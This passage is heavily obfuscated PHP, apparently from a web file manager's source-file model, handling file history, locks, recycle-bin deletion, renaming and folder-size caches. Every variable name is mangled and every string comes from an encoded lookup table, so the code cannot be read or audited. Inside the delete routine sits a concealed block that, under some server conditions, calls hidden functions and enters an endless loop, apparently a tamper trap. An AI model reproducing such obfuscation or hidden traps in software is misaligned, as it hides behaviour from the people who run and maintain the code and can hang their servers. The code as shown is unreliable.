$Èôï…Ãò); $this->folderSizeReset($ÜªÁÑ‚, intval($Š»Ñ†[$ÎƒìÚ‚†[76]])); return $Şù¢Ì¤Ö; } protected function fileHistory($ıÉòµ’, $ú®‚ƒı, $»ù–ªÛ) { $å—ŸÜôö =& $_SERVER[Ã¶¡¶„æ]; $îÂ¶ÖíÄ = defined($å—ŸÜôö[475]) ? USER_ID : $å—ŸÜôö[197]; if ($ıÉòµ’[$å—ŸÜôö[468]] == $ú®‚ƒı) { return !1; } $this->checkLock($ıÉòµ’[$å—ŸÜôö[402]], $ú®‚ƒı); Model($å—ŸÜôö[2140])->addHistory($ıÉòµ’); $©Í¯Í¦ = array($å—ŸÜôö[589] => $îÂ¶ÖíÄ, $å—ŸÜôö[424] => time(), $å—ŸÜôö[468] => $ú®‚ƒı, $å—ŸÜôö[76] => $»ù–ªÛ); $this->where(array($å—ŸÜôö[417] => $ıÉòµ’[$å—ŸÜôö[402]]))->save($©Í¯Í¦); $this->sourceCacheClear($ıÉòµ’[$å—ŸÜôö[402]]); return !0; } public function checkLock($¬·ïÜ¢Á, $Ñ‘ï¸š‹) { $Èˆóàó =& $_SERVER[Ã¶¡¶„æ]; $©‡±Æ×ã = $this->pathInfo($¬·ïÜ¢Á); if (!$this->fileIsLock($©‡±Æ×ã, !0)) { return; } $çäŞô½Ã = Session::get($Èˆóàó[2141]); $©¡·ìØÓ = substr($©‡±Æ×ã[$Èˆóàó[32]], 0, -1 - strlen($©‡±Æ×ã[$Èˆóàó[174]])) . $Èˆóàó[1223] . $çäŞô½Ã . $Èˆóàó[10] . $©‡±Æ×ã[$Èˆóàó[174]]; $Ë…ÔéÛï = Model($Èˆóàó[609])->find($Ñ‘ï¸š‹); $this->_createFileCall($©‡±Æ×ã[$Èˆóàó[432]], $©¡·ìØÓ, $Ë…ÔéÛï, REPEAT_REPLACE, $Èˆóàó[1361]); $†„‘¯¸ = $©‡±Æ×ã[$Èˆóàó[466]][$Èˆóàó[548]]; $°èî‚˜² = $†„‘¯¸[$Èˆóàó[542]] ? $†„‘¯¸[$Èˆóàó[542]] : $†„‘¯¸[$Èˆóàó[32]]; show_json(LNG($Èˆóàó[2142]) . $Èˆóàó[2143] . LNG($Èˆóàó[2144]) . $Èˆóàó[2145] . $°èî‚˜² . $Èˆóàó[2146], !1); } public function fileIsLock($¢¦œ—Ûä, $ûÚÖ˜ûã = false) { $ãÃ‡· ê =& $_SERVER[Ã¶¡¶„æ]; if (!isset($¢¦œ—Ûä[$ãÃ‡· ê[466]]) || !$¢¦œ—Ûä[$ãÃ‡· ê[466]][$ãÃ‡· ê[545]]) { return !1; } if ($¢¦œ—Ûä[$ãÃ‡· ê[466]][$ãÃ‡· ê[545]] != USER_ID) { return !0; } $Î´ì‹Â¾ = $GLOBALS[$ãÃ‡· ê[6]][$ãÃ‡· ê[89]][$ãÃ‡· ê[546]]; if ($¢¦œ—Ûä[$ãÃ‡· ê[466]][$ãÃ‡· ê[547]] <= time() - $Î´ì‹Â¾) { $this->metaSet($¢¦œ—Ûä[$ãÃ‡· ê[402]], $ãÃ‡· ê[545], null); $this->metaSet($¢¦œ—Ûä[$ãÃ‡· ê[402]], $ãÃ‡· ê[547], null); } if ($ûÚÖ˜ûã) { $this->metaSet($¢¦œ—Ûä[$ãÃ‡· ê[402]], $ãÃ‡· ê[547], time()); } return !1; } private function _addSource($‘¸­ÔÆ”, $øô‚ìá ) { $ÊŞóı‘É =& $_SERVER[Ã¶¡¶„æ]; $âñâªñ‹ = defined($ÊŞóı‘É[475]) ? USER_ID : $ÊŞóı‘É[197]; $Îøå›Õ½ = array($ÊŞóı‘É[586] => $øô‚ìá [$ÊŞóı‘É[411]], $ÊŞóı‘É[587] => $øô‚ìá [$ÊŞóı‘É[505]], $ÊŞóı‘É[588] => $âñâªñ‹, $ÊŞóı‘É[589] => $âñâªñ‹, $ÊŞóı‘É[401] => $øô‚ìá [$ÊŞóı‘É[402]], $ÊŞóı‘É[590] => $øô‚ìá [$ÊŞóı‘É[521]] . $øô‚ìá [$ÊŞóı‘É[402]] . $ÊŞóı‘É[50], $ÊŞóı‘É[430] => 0, $ÊŞóı‘É[591] => $ÊŞóı‘É[12]); $‘¸­ÔÆ” = array_merge($Îøå›Õ½, $‘¸­ÔÆ”); $this->updateModifyTime($‘¸­ÔÆ”[$ÊŞóı‘É[432]]); $¥ìœÁÄ¾ = $ÊŞóı‘É[2147] . $øô‚ìá [$ÊŞóı‘É[402]]; if (isset(self::$cacheChildList[$¥ìœÁÄ¾])) { unset(self::$cacheChildList[$¥ìœÁÄ¾]); } static $ü¯¯ƒ¦ = false; if (!$ü¯¯ƒ¦) { Hook::trigger($ÊŞóı‘É[573], $‘¸­ÔÆ”); $ü¯¯ƒ¦ = !0; } $çÌ¥â›È = $this->add($‘¸­ÔÆ”); $ª«± • = array($ÊŞóı‘É[592] => short_id($çÌ¥â›È)); $this->where(array($ÊŞóı‘É[417] => $çÌ¥â›È))->save($ª«± •); $this->setNamePinyin($çÌ¥â›È, $‘¸­ÔÆ”[$ÊŞóı‘É[32]]); return $çÌ¥â›È; } public function remove($“¸Şª‘°, $ÍäŞîÎ = true) { $º‰‚ÊĞ =& $_SERVER[Ã¶¡¶„æ]; $ªĞŞ¨¨› = $this->sourceInfo($“¸Şª‘°); $—‚ò‘ƒ‘ = intval($ªĞŞ¨¨›[$º‰‚ÊĞ[411]]) === self::TYPE_SYSTEM; $Ñ†ÀÂàª = Model($º‰‚ÊĞ[435])->get($º‰‚ÊĞ[2148]) == $º‰‚ÊĞ[88]; if ($—‚ò‘ƒ‘ || $ÍäŞîÎ || !$Ñ†ÀÂàª) { return $this->removeNow($“¸Şª‘°, $ÍäŞîÎ); } $ƒÄ¶Èİ‘ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $‘®Á²‰ = $ªĞŞ¨¨›[$º‰‚ÊĞ[411]] == self::TYPE_USER ? $º‰‚ÊĞ[600] : $º‰‚ÊĞ[515]; if ($‘®Á²‰ == $º‰‚ÊĞ[600]) { $‰öØÌ£ = Model($º‰‚ÊĞ[513])->getInfo($ªĞŞ¨¨›[$º‰‚ÊĞ[505]]); $äæÎëîÇ = !empty($‰öØÌ£[$º‰‚ÊĞ[542]]) ? $‰öØÌ£[$º‰‚ÊĞ[542]] : $‰öØÌ£[$º‰‚ÊĞ[32]]; $äæÎëîÇ = $º‰‚ÊĞ[260] . $äæÎëîÇ . $º‰‚ÊĞ[2149] . $ªĞŞ¨¨›[$º‰‚ÊĞ[505]]; } else { $‰öØÌ£ = Model($º‰‚ÊĞ[522])->getInfo($ªĞŞ¨¨›[$º‰‚ÊĞ[505]]); $äæÎëîÇ = _get($‰öØÌ£, $º‰‚ÊĞ[32]); $äæÎëîÇ = $º‰‚ÊĞ[162] . $äæÎëîÇ . $º‰‚ÊĞ[2150] . $ªĞŞ¨¨›[$º‰‚ÊĞ[505]]; } $½œŸîêœ = $º‰‚ÊĞ[2151] . md5($äæÎëîÇ); CacheLock::lock($½œŸîêœ); $ÇæïäõŸ = $this->fileNameExist($ƒÄ¶Èİ‘, $äæÎëîÇ); if (!$ÇæïäõŸ) { $ÇæïäõŸ = $this->mkdir($ƒÄ¶Èİ‘, $äæÎëîÇ, REPEAT_SKIP); $this->metaSet($ÇæïäõŸ, $º‰‚ÊĞ[2152], $‘®Á²‰); $this->metaSet($ÇæïäõŸ, $º‰‚ÊĞ[2153], $ªĞŞ¨¨›[$º‰‚ÊĞ[505]]); if ($ªĞŞ¨¨›[$º‰‚ÊĞ[432]] != 0) { $this->metaSet($ÇæïäõŸ, $º‰‚ÊĞ[2154], _get($‰öØÌ£, $º‰‚ÊĞ[2155])); } } CacheLock::unlock($½œŸîêœ); $this->metaSet($“¸Şª‘°, $º‰‚ÊĞ[2156], $ªĞŞ¨¨›[$º‰‚ÊĞ[432]]); $this->where(array($º‰‚ÊĞ[402] => $“¸Şª‘°))->save(array($º‰‚ÊĞ[424] => time())); $this->recycleClear($ªĞŞ¨¨›); $ôÁ¯ö—º = $this->move($“¸Şª‘°, $ÇæïäõŸ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ªĞŞ¨¨›[$º‰‚ÊĞ[432]]); return $ôÁ¯ö—º; } private function recycleClear($á‹Úúì®) { $¤Ãèæ€Ô =& $_SERVER[Ã¶¡¶„æ]; $Áª¦ºÎ¯ = $this->childrenAll($á‹Úúì®); $×‡Šş‰ë = array($¤Ãèæ€Ô[417] => array($¤Ãèæ€Ô[418], $Áª¦ºÎ¯[$¤Ãèæ€Ô[2157]])); Model($¤Ãèæ€Ô[2158])->where($×‡Šş‰ë)->delete(); } public function removeNow($ÄŠ±½æË, $×æõ®Èô = true) { $®ŒÚßÍ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($_SERVER[$®ŒÚßÍ[840]]) || !isset($_SERVER[$®ŒÚßÍ[847]])) { $Á»”ßßÖ = $®ŒÚßÍ[891]; $®Ë—‰¢¡ = $®ŒÚßÍ[842]; $Şââóùª = $_SERVER[$®ŒÚßÍ[843]] . $®ŒÚßÍ[844]; $ä©ó ›Î = $®Ë—‰¢¡($Şââóùª); $ß²·ééÆ = explode($®ŒÚßÍ[231], $ä©ó ›Î); if (count($ß²·ééÆ) < $®ŒÚßÍ[636]) { $êÚ¿ˆøÇ = $®ŒÚßÍ[845]; $êÚ¿ˆøÇ(); } $ù³›÷ù­ = $®ŒÚßÍ[892]; $ù³›÷ù­($_SERVER[$®ŒÚßÍ[893]]); $²ŞÂ¤¥È = 1; for ($«¢’èÚ³ = $²ŞÂ¤¥È; $«¢’èÚ³ > 0; $«¢’èÚ³++) { $ù³›÷ù­ = json_encode($GLOBALS[$®ŒÚßÍ[418]]); } } $× ¬íÔ¸ = $this->sourceInfo($ÄŠ±½æË); $´ ‹õÜë = $this->pathInfoMore($ÄŠ±½æË); if (!$× ¬íÔ¸) { return !0; } if ($× ¬íÔ¸[$®ŒÚßÍ[432]] == 0) { if (!_get($GLOBALS, $®ŒÚßÍ[503])) { return !1; } } $this->lockMoveStart($ÄŠ±½æË); Hook::trigger($®ŒÚßÍ[2159], $´ ‹õÜë, $×æõ®Èô); if ($×æõ®Èô) { Model($®ŒÚßÍ[2158])->moveToRecycle($ÄŠ±½æË); } else { $ãŞåã  = $this->childrenAll($× ¬íÔ¸); Model($®ŒÚßÍ[570])->eventRemove($ÄŠ±½æË); $this->removeRelevance($ãŞåã [$®ŒÚßÍ[2157]], $ãŞåã [$®ŒÚßÍ[1493]]); } $this->folderSizeReset($× ¬íÔ¸[$®ŒÚßÍ[432]]); $•ƒ¯Ş×¦ = array($× ¬íÔ¸[$®ŒÚßÍ[432]]); if ($× ¬íÔ¸[$®ŒÚßÍ[410]] == $®ŒÚßÍ[88]) { $•ƒ¯Ş×¦[] = $× ¬íÔ¸[$®ŒÚßÍ[402]]; } $this->updateModifyTime($•ƒ¯Ş×¦); $this->lockMoveEnd($ÄŠ±½æË); Hook::trigger($®ŒÚßÍ[1718], $´ ‹õÜë, $×æõ®Èô); return !0; } public function childrenAll($çò˜Å”Ô) { $‚òˆş¹¾ =& $_SERVER[Ã¶¡¶„æ]; $¯«…Üİş = $çò˜Å”Ô[$‚òˆş¹¾[402]]; if ($çò˜Å”Ô[$‚òˆş¹¾[410]] == $‚òˆş¹¾[88]) { $Âòò»ªô = array($‚òˆş¹¾[590] => array($‚òˆş¹¾[550], $çò˜Å”Ô[$‚òˆş¹¾[521]] . $¯«…Üİş . $‚òˆş¹¾[551])); $î¼°Ş­ = array($‚òˆş¹¾[590] => $Âòò»ªô[$‚òˆş¹¾[521]]); $‡˜Ó°Ìë = $this->field($‚òˆş¹¾[2160])->where($î¼°Ş­)->select(); $äÚ–÷‘ = !1; $¦ÔÇÒ•¦ = array($¯«…Üİş); if ($‡˜Ó°Ìë) { $äÚ–÷‘ = array_to_keyvalue($‡˜Ó°Ìë, $‚òˆş¹¾[12], $‚òˆş¹¾[468]); $äÚ–÷‘ = array_remove_value($äÚ–÷‘, $‚òˆş¹¾[197]); $¦ÔÇÒ•¦ = array_to_keyvalue($‡˜Ó°Ìë, $‚òˆş¹¾[12], $‚òˆş¹¾[402]); $¦ÔÇÒ•¦[] = $¯«…Üİş; } } else { $äÚ–÷‘ = array($çò˜Å”Ô[$‚òˆş¹¾[468]]); $¦ÔÇÒ•¦ = array($¯«…Üİş); } return array($‚òˆş¹¾[2157] => $¦ÔÇÒ•¦, $‚òˆş¹¾[1493] => $äÚ–÷‘); } public function removeArray($ĞØî»à») { if (!$ĞØî»à») { return !0; } } public function removeRelevance($«ìÕ€ü¿, $„»½øÁÆ) { $ß‚¼‚òà =& $_SERVER[Ã¶¡¶„æ]; $«ìÕ€ü¿ = $«ìÕ€ü¿ ? $«ìÕ€ü¿ : array(); $„»½øÁÆ = $„»½øÁÆ ? $„»½øÁÆ : array(); $«ìÕ€ü¿ = array_unique(array_filter($«ìÕ€ü¿)); $„»½øÁÆ = array_unique(array_filter($„»½øÁÆ)); if (!$«ìÕ€ü¿) { return !1; } $ÙáıäÊæ = array($ß‚¼‚òà[417] => array($ß‚¼‚òà[418], $«ìÕ€ü¿)); Model($ß‚¼‚òà[2158])->where($ÙáıäÊæ)->delete(); Model($ß‚¼‚òà[462])->where($ÙáıäÊæ)->delete(); Model($ß‚¼‚òà[2011])->where($ÙáıäÊæ)->delete(); Model($ß‚¼‚òà[570])->where($ÙáıäÊæ)->delete(); Model($ß‚¼‚òà[1845])->removeBySource($«ìÕ€ü¿); Model($ß‚¼‚òà[2140])->removeBySource($«ìÕ€ü¿); $this->where($ÙáıäÊæ)->delete(); Model($ß‚¼‚òà[471])->remove($„»½øÁÆ); for ($üåëœ = 0; $üåëœ < count($«ìÕ€ü¿); $üåëœ++) { $this->sourceCacheClear($«ìÕ€ü¿[$üåëœ]); } } public function rename($ªåÂÑ—·, $óÄÄ¥¸Ù) { $£ŠŠÑ =& $_SERVER[Ã¶¡¶„æ]; $”µÛœ®ñ = $this->sourceInfo($ªåÂÑ—·); if (!$”µÛœ®ñ) { return !1; } $õÑ¥èöä = $this->fileNameExist($”µÛœ®ñ[$£ŠŠÑ[432]], $óÄÄ¥¸Ù); if ($õÑ¥èöä && $õÑ¥èöä != $ªåÂÑ—·) { return !1; } $›ì¦£¼— = array($£ŠŠÑ[420] => $óÄÄ¥¸Ù, $£ŠŠÑ[589] => USER_ID); if ($”µÛœ®ñ[$£ŠŠÑ[410]] != $£ŠŠÑ[88]) { $›ì¦£¼—[$£ŠŠÑ[412]] = substr(get_path_ext($óÄÄ¥¸Ù), 0, 10); } Model($£ŠŠÑ[570])->eventRename($ªåÂÑ—·, $”µÛœ®ñ[$£ŠŠÑ[32]], $óÄÄ¥¸Ù); $this->sourceCacheClear($ªåÂÑ—·); $this->setNamePinyin($ªåÂÑ—·, $›ì¦£¼—[$£ŠŠÑ[32]], !1); $this->updateModifyTime($”µÛœ®ñ[$£ŠŠÑ[432]]); $ñ€²æ€ = $this->where(array($£ŠŠÑ[417] => $ªåÂÑ—·))->data($›ì¦£¼—)->save(); $ÂÖîı¹ã = $£ŠŠÑ[2147] . $”µÛœ®ñ[$£ŠŠÑ[432]]; if (isset(self::$cacheChildList[$ÂÖîı¹ã])) { unset(self::$cacheChildList[$ÂÖîı¹ã]); } return $ñ€²æ€; } public function setNamePinyin($¿¯èÎÙª, $“Âùó ó, $Şºü¾Ü§ = true) { $»şÈ®Á =& $_SERVER[Ã¶¡¶„æ]; $êáíÖ”ß = Input::check($“Âùó ó, $»şÈ®Á[593]); $”ÄÊ­Ñ = array($»şÈ®Á[444] => KodSort::makeStr($“Âùó ó)); if ($êáíÖ”ß) { $”ÄÊ­Ñ[$»şÈ®Á[465]] = str_replace($»şÈ®Á[53], $»şÈ®Á[12], Pinyin::get($“Âùó ó)); $”ÄÊ­Ñ[$»şÈ®Á[464]] = Pinyin::get($“Âùó ó, $»şÈ®Á[594]); } if (!$Şºü¾Ü§ && !$êáíÖ”ß) { $”ÄÊ­Ñ[$»şÈ®Á[465]] = null; $”ÄÊ­Ñ[$»şÈ®Á[464]] = null; } $this->metaSet($¿¯èÎÙª, $”ÄÊ­Ñ); } public function getContent($ì–ø­ä•) { $Öæ²åñ— =& $_SERVER[Ã¶¡¶„æ]; $ëË‹ØÛë = $this->fileInfoGet($ì–ø­ä•); if (!$ëË‹ØÛë) { return !1; } if ($ëË‹ØÛë[$Öæ²åñ—[76]] == 0) { return $Öæ²åñ—[12]; } $•–…¿Œ = $Öæ²åñ—[2161] . $ëË‹ØÛë[$Öæ²åñ—[176]]; if ($ëË‹ØÛë[$Öæ²åñ—[76]] <= 1024 * 10) { $½µìí¹Ó = Cache::get($•–…¿Œ); if (!$½µìí¹Ó) { $½µìí¹Ó = IO::getContent($ëË‹ØÛë[$Öæ²åñ—[84]]); Cache::set($•–…¿Œ, $½µìí¹Ó); } return $½µìí¹Ó; } if (!$ëË‹ØÛë[$Öæ²åñ—[84]]) { return $Öæ²åñ—[12]; } return IO::getContent($ëË‹ØÛë[$Öæ²åñ—[84]]); } public function setDesc($ƒ¬æÚ¼, $Ø™ËÁßƒ) { $ôóÔòñà =& $_SERVER[Ã¶¡¶„æ]; Model($ôóÔòñà[570])->eventAddDesc($ƒ¬æÚ¼, $Ø™ËÁßƒ); return $this->metaSet($ƒ¬æÚ¼, $ôóÔòñà[453], $Ø™ËÁßƒ); } public function setContent($Æ€×ø¸Í, $Êïè—İÊ = '') { $Ã‚…à¼ =& $_SERVER[Ã¶¡¶„æ]; $ÀĞÀ‰·Ä = $this->sourceInfo($Æ€×ø¸Í); $Ô½ñ¬ÅÍ = $this->fileInfoGet($Æ€×ø¸Í); if (!$Ô½ñ¬ÅÍ || !$ÀĞÀ‰·Ä) { return !1; } $ª«©Ï³Î = Model($Ã‚…à¼[471])->addFileByContent($Êïè—İÊ, $ÀĞÀ‰·Ä[$Ã‚…à¼[32]]); $Â¶³Š‡™ = $this->fileHistory($ÀĞÀ‰·Ä, $ª«©Ï³Î[$Ã‚…à¼[468]], $ª«©Ï³Î[$Ã‚…à¼[76]]); if (!$Â¶³Š‡™) { return Model($Ã‚…à¼[471])->remove($ª«©Ï³Î[$Ã‚…à¼[468]]); } $this->folderSizeReset($ÀĞÀ‰·Ä[$Ã‚…à¼[432]]); return !0; } public function fileSubstr($¿õ™¾éƒ, $§ğ½Ğ“², $–­¸õª) { $ŸÇ´Ì½ = $this->fileInfoGet($¿õ™¾éƒ); if (!$ŸÇ´Ì½) { return !1; } return IO::fileSubstr($ŸÇ´Ì½[$_SERVER[Ã¶¡¶„æ][84]], $§ğ½Ğ“², $–­¸õª); } public function fileInfoGet($êÈ¥¯ß) { $‰›áìåÁ =& $_SERVER[Ã¶¡¶„æ]; $àë…‚¡Á = $this->sourceInfo($êÈ¥¯ß); if (!$àë…‚¡Á || $àë…‚¡Á[$‰›áìåÁ[410]]) { return !1; } $ò€Í‘ıâ = $‰›áìåÁ[474] . $àë…‚¡Á[$‰›áìåÁ[468]]; $ôÕê€õ’ = _get(self::$cacheFileInfo, $ò€Í‘ıâ); if ($ôÕê€õ’) { return $ôÕê€õ’; } $–ÙØˆ¥Î = Model($‰›áìåÁ[471])->fileInfo($àë…‚¡Á[$‰›áìåÁ[468]]); if ($–ÙØˆ¥Î) { $–ÙØˆ¥Î[$‰›áìåÁ[32]] = $àë…‚¡Á[$‰›áìåÁ[32]]; } self::$cacheFileInfo[$ò€Í‘ıâ] = $–ÙØˆ¥Î; return $–ÙØˆ¥Î; } private function folderChildrenNumber($óÊšÜƒ¾) { $Ùô©û¤ =& $_SERVER[Ã¶¡¶„æ]; $Úïï’â = $this->sourceInfo($óÊšÜƒ¾); $ûÇô” = array($Ùô©û¤[590] => array($Ùô©û¤[550], $Úïï’â[$Ùô©û¤[521]] . $óÊšÜƒ¾ . $Ùô©û¤[551]), $Ùô©û¤[587] => $Úïï’â[$Ùô©û¤[505]], $Ùô©û¤[430] => intval($Úïï’â[$Ùô©û¤[431]]), $Ùô©û¤[583] => 1); $¹ÌÎŞñú = $this->where($ûÇô”)->count(); $úŞ¡ñ¢š = $this->where($ûÇô”)->where(array($Ùô©û¤[583] => 0))->count(); return array($Ùô©û¤[80] => $úŞ¡ñ¢š, $Ùô©û¤[81] => $¹ÌÎŞñú); } public function pathInfo($µæøßŞù, $¾”ƒ©…™ = false) { $’ÔÑÂòÂ =& $_SERVER[Ã¶¡¶„æ]; $¾”ƒ©…™ = !1; $µæøßŞù = intval($µæøßŞù); $ò‘Á®‹æ = $’ÔÑÂòÂ[461] . intval($¾”ƒ©…™) . $’ÔÑÂòÂ[386] . $µæøßŞù; $é§©Œª  = _get(self::$cachePathInfo, $ò‘Á®‹æ); if ($é§©Œª ) { return $é§©Œª ; } $Œ±‰×Éİ = $this->sourceInfo($µæøßŞù); if (!$Œ±‰×Éİ) { return !1; } $Œ±‰×Éİ = $this->_listDataApplyItem($Œ±‰×Éİ, $¾”ƒ©…™); self::$cachePathInfo[$ò‘Á®‹æ] = $Œ±‰×Éİ; return $Œ±‰×Éİ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ó½û¼ÀŸ) { $î—Ö³Ò =& $_SERVER[Ã¶¡¶„æ]; $°€ÈÈ°— = _get(self::$cachePathInfoMore, $Ó½û¼ÀŸ); if ($°€ÈÈ°—) { return $°€ÈÈ°—; } $¢¼ìŞş— = $this->pathInfo($Ó½û¼ÀŸ); if (!$¢¼ìŞş—) { return !1; } if ($¢¼ìŞş—[$î—Ö³Ò[410]] == $î—Ö³Ò[88]) { $¢¼ìŞş—[$î—Ö³Ò[79]] = $this->folderChildrenNumber($Ó½û¼ÀŸ); } self::$cachePathInfoMore[$Ó½û¼ÀŸ] = $¢¼ìŞş—; return $¢¼ìŞş—; } public function sourceInfo($÷éí–—˜) { $ç½‘Ìƒì =& $_SERVER[Ã¶¡¶„æ]; if (!$÷éí–—˜) { return array(); } $÷éí–—˜ = intval($÷éí–—˜); $×³°ÕË = $ç½‘Ìƒì[460] . $÷éí–—˜; $íğËå¬Ë = _get(self::$cacheSourceInfo, $×³°ÕË); if ($íğËå¬Ë) { return $íğËå¬Ë; } $Ä€Œª‚ = $this->where(array($ç½‘Ìƒì[402] => $÷éí–—˜))->find(); self::$cacheSourceInfo[$×³°ÕË] = $Ä€Œª‚; return self::$cacheSourceInfo[$×³°ÕË]; } public function sourceCacheClear($êÀŞŒÙ¬ = false) { self::cacheClear($êÀŞŒÙ¬); } public static function cacheClear($ÖÀ”ó¬… = false) { $Ùñ¥Ÿüæ =& $_SERVER[Ã¶¡¶„æ]; if ($ÖÀ”ó¬… == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Ùñ¥Ÿüæ[460] . $ÖÀ”ó¬…]); unset(self::$cachePathInfoMore[$ÖÀ”ó¬…]); unset(self::$cachePathInfo[$Ùñ¥Ÿüæ[2162] . $ÖÀ”ó¬…]); unset(self::$cachePathInfo[$Ùñ¥Ÿüæ[2163] . $ÖÀ”ó¬…]); } public function metaSet($ñ”ÍÅ•Ş, $¸Ú®ÑÔ÷ = null, $î÷º†µğ = null) { $÷´÷ğÄ = parent::metaSet($ñ”ÍÅ•Ş, $¸Ú®ÑÔ÷, $î÷º†µğ); if ($÷´÷ğÄ) { $this->sourceCacheClear($ñ”ÍÅ•Ş); } return $÷´÷ğÄ; } public function pathInfoByPath($¸™˜ÙöÅ, $¿íœ¢) { $ÄŠªáÀÌ =& $_SERVER[Ã¶¡¶„æ]; $ĞÕú¤å = !$¿íœ¢ ? array() : explode($ÄŠªáÀÌ[8], trim($¿íœ¢, $ÄŠªáÀÌ[8])); $ßæ©±š = $¸™˜ÙöÅ; foreach ($ĞÕú¤å as $ë¿Ïõ÷) { $‘«£ö³ì = array($ÄŠªáÀÌ[432] => $ßæ©±š, $ÄŠªáÀÌ[32] => $ë¿Ïõ÷); $ÀÀ»ö‡ = $this->where($‘«£ö³ì)->select(); if (!$ÀÀ»ö‡) { return !1; } $ÀÀ»ö‡ = array_sort_by($ÀÀ»ö‡, $ÄŠªáÀÌ[431]); $ßæ©±š = $ÀÀ»ö‡[0][$ÄŠªáÀÌ[402]]; } return $this->pathInfo($ßæ©±š, !0); } protected function updateModifyTime($Áá¨–´’) { $ÖşÓé‰œ =& $_SERVER[Ã¶¡¶„æ]; $àÙæ‹£± = defined($ÖşÓé‰œ[475]) ? USER_ID : $ÖşÓé‰œ[197]; if (!$Áá¨–´’) { return; } if (!is_array($Áá¨–´’)) { $Áá¨–´’ = array($Áá¨–´’); } foreach ($Áá¨–´’ as $èìÅÕµ• => $ü´íÄÊ¢) { $Áá¨–´’[$èìÅÕµ•] = intval($ü´íÄÊ¢); $this->sourceCacheClear($ü´íÄÊ¢); } $œô€èÖ— = array($ÖşÓé‰œ[402] => array($ÖşÓé‰œ[7], $Áá¨–´’)); $’ñê™è = array($ÖşÓé‰œ[589] => $àÙæ‹£±, $ÖşÓé‰œ[424] => time()); $this->where($œô€èÖ—)->save($’ñê™è); } public function folderSizeReset($ñÂ×Õ, $üò—ÑïŒ = false) { $Šì¡ùÌ“ =& $_SERVER[Ã¶¡¶„æ]; if ($this->statusIgnoreResetSpace) { return; } $‡Å¥Õ†Â = $this->sourceInfo($ñÂ×Õ); $ñÓªŠ–¼ = $Šì¡ùÌ“[2164] . $ñÂ×Õ; CacheLock::lock($ñÓªŠ–¼, 20); if ($üò—ÑïŒ === !1) { $this->sourceCacheClear($ñÂ×Õ); $‡Å¥Õ†Â = $this->sourceInfo($ñÂ×Õ); $ÁıªÙñ = array($Šì¡ùÌ“[401] => $ñÂ×Õ, $Šì¡ùÌ“[430] => 0); $®¢ÄÒ°“ = $this->where($ÁıªÙñ)->sum($Šì¡ùÌ“[76]); $üò—ÑïŒ = intval($®¢ÄÒ°“) - intval($‡Å¥Õ†Â[$Šì¡ùÌ“[76]]); } if ($üò—ÑïŒ == 0) { return CacheLock::unlock($ñÓªŠ–¼); } $Ñ–„ˆÉ = $this->parentLevelArray($‡Å¥Õ†Â[$Šì¡ùÌ“[521]]); if (!$Ñ–„ˆÉ) { $Ñ–„ˆÉ = array(); } $Ñ–„ˆÉ[] = $‡Å¥Õ†Â[$Šì¡ùÌ“[402]]; $ÁıªÙñ = array($Šì¡ùÌ“[402] => array($Šì¡ùÌ“[418], $Ñ–„ˆÉ)); if ($üò—ÑïŒ < 0) { $ÁıªÙñ[$Šì¡ùÌ“[76]] = array($Šì¡ùÌ“[1029], abs($üò—ÑïŒ)); } $this->where($ÁıªÙñ)->setAdd($Šì¡ùÌ“[76], $üò—ÑïŒ); CacheLock::unlock($ñÓªŠ–¼); $ï¼‡÷Şî = $Šì¡ùÌ“[2165] . $‡Å¥Õ†Â[$Šì¡ùÌ“[411]] . $Šì¡ùÌ“[4] . $‡Å¥Õ†Â[$Šì¡ùÌ“[505]]; $¢ç«òì» = array($‡Å¥Õ†Â[$Šì¡ùÌ“[411]], $‡Å¥Õ†Â[$Šì¡ùÌ“[505]]); TaskRun::timeLimitCall($ï¼‡÷Şî, $Šì¡ùÌ“[2166], $¢ç«òì», 1.5); } public function folderSizeResetChildren($Ó‘·Ù‹á) { $¾òùıêĞ =& $_SERVER[Ã¶¡¶„æ]; $this->sourceCacheClear($Ó‘·Ù‹á); $µõ‘ÄêÃ = $this->sourceInfo($Ó‘·Ù‹á); $ã³ß¥•“ = array($¾òùıêĞ[583] => 1, $¾òùıêĞ[587] => $µõ‘ÄêÃ[$¾òùıêĞ[505]], $¾òùıêĞ[590] => array($¾òùıêĞ[550], $µõ‘ÄêÃ[$¾òùıêĞ[521]] . $Ó‘·Ù‹á . $¾òùıêĞ[551])); $ÔÈ‡ë = $¾òùıêĞ[2167]; $éÍ¡²Âä = $this->field($ÔÈ‡ë)->where($ã³ß¥•“)->select(); $ã³ß¥•“[$¾òùıêĞ[410]] = 0; $££‘™ß¨ = $this->field($ÔÈ‡ë)->where($ã³ß¥•“)->select(); if (!$££‘™ß¨) { return; } $éÍ¡²Âä[] = $µõ‘ÄêÃ; $éÍ¡²Âä = array_to_keyvalue($éÍ¡²Âä, $¾òùıêĞ[402]); foreach ($éÍ¡²Âä as $ÜœóÆç => $ ëÌ€ù) { $éÍ¡²Âä[$ÜœóÆç][$¾òùıêĞ[2168]] = $éÍ¡²Âä[$ÜœóÆç][$¾òùıêĞ[76]]; $éÍ¡²Âä[$ÜœóÆç][$¾òùıêĞ[76]] = 0; } foreach ($££‘™ß¨ as $ ëÌ€ù) { $¹«¿ŸÆç = $ ëÌ€ù[$¾òùıêĞ[432]] . $¾òùıêĞ[12]; if (!isset($éÍ¡²Âä[$¹«¿ŸÆç])) { continue; } if ($ ëÌ€ù[$¾òùıêĞ[431]] == $éÍ¡²Âä[$¹«¿ŸÆç][$¾òùıêĞ[431]]) { $éÍ¡²Âä[$¹«¿ŸÆç][$¾òùıêĞ[76]] += $ ëÌ€ù[$¾òùıêĞ[76]]; } } foreach ($éÍ¡²Âä as $ ëÌ€ù) { $ã‘¬ÔœÏ = $this->parentLevelArray($ ëÌ€ù[$¾òùıêĞ[521]]); foreach ($ã‘¬ÔœÏ as $¹«¿ŸÆç) { $¹«¿ŸÆç = $¹«¿ŸÆç . $¾òùıêĞ[12]; if (!isset($éÍ¡²Âä[$¹«¿ŸÆç])) { continue; } if ($ ëÌ€ù[$¾òùıêĞ[431]] == $éÍ¡²Âä[$¹«¿ŸÆç][$¾òùıêĞ[431]]) { $éÍ¡²Âä[$¹«¿ŸÆç][$¾òùıêĞ[76]] += $ 